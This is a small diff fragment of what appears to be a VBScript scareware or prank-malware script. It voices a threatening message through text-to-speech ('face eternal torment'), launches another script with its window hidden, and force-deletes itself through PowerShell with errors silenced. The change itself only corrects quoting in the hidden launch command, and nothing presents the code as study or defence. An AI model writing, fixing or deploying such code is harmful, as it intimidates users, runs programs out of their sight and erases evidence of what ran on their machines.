@@ -26,6 +26,6 @@ WScript.Sleep 1000 + Rnd * 1000
 
 spVoice.Speak "You thought you could cheat the abyss. You were wrong. Answer the riddle, or face eternal torment.", 1
 
-x7p9q.Run "wscript.exe '" & path & "'", 0, True
+x7p9q.Run "wscript.exe """ & path & """", 0, True
 
 x7p9q.Run "powershell remove-item -path '" & WScript.ScriptFullName & "' -Force -ErrorAction SilentlyContinue", 0, True
